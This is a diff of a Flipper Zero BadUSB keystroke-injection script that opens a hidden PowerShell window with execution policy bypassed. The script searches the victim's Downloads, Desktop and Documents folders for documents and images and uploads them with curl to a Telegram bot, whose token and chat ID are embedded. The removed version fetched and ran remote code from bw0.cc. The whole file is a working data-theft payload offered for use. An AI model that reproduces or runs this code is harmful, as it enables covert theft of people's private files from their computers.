@@ -1,19 +1,65 @@
+REM ============================================
+REM Flipper Zero - File Exfiltrator FINAL
+REM Correct sequence: Win+R → cmd → PowerShell
+REM ============================================
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DEFAULT_DELAY 300
+DELAY 5000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 2000
+STRING cmd
+DELAY 1000
 ENTER
+DELAY 2000
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command 
+DELAY 1500
+STRING "
+# Configuration
+`$BOT = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$CHAT = '6614794141'
 
+# Start message
+`$START_MSG = '[Flipper] Connected to ' + `$env:COMPUTERNAME
+curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=`$START_MSG`"
+Start-Sleep -Seconds 2
+
+# Scan user folders
+`$FOLDERS = @('Downloads', 'Desktop', 'Documents')
+`$SENT = 0
+
+foreach (`$FOLDER in `$FOLDERS) {
+    `$FULL_PATH = `$env:USERPROFILE + '\\' + `$FOLDER
+    
+    if (Test-Path `$FULL_PATH -ErrorAction SilentlyContinue) {
+        # Look for common file types
+        `$FILES = Get-ChildItem -Path `$FULL_PATH `
+            -Include '*.txt', '*.pdf', '*.doc', '*.docx', '*.jpg', '*.png' `
+            -File -Recurse -ErrorAction SilentlyContinue -Depth 1 `
+            | Select-Object -First 3
+        
+        foreach (`$FILE in `$FILES) {
+            # Telegram file size limit: 50MB, using 20MB for safety
+            if (`$FILE.Length -lt 20MB) {
+                curl.exe -s -F `"chat_id=`$CHAT`" `
+                         -F `"document=@`$(`$FILE.FullName)`" `
+                         `"https://api.telegram.org/bot`$BOT/sendDocument`"
+                `$SENT++
+                Start-Sleep -Seconds 2
+            }
+        }
+    }
+}
+
+# Completion message
+`$END_MSG = '[Flipper] Scan complete.`n' +
+            'Files sent: ' + `$SENT + '`n' +
+            'From: ' + `$env:COMPUTERNAME + '`n' +
+            'User: ' + `$env:USERNAME
+
+curl.exe `"https://api.telegram.org/bot`$BOT/sendMessage?chat_id=`$CHAT&text=`$END_MSG`"
+
+# Clean exit
+exit 0
+"
+DELAY 1000
+ENTER
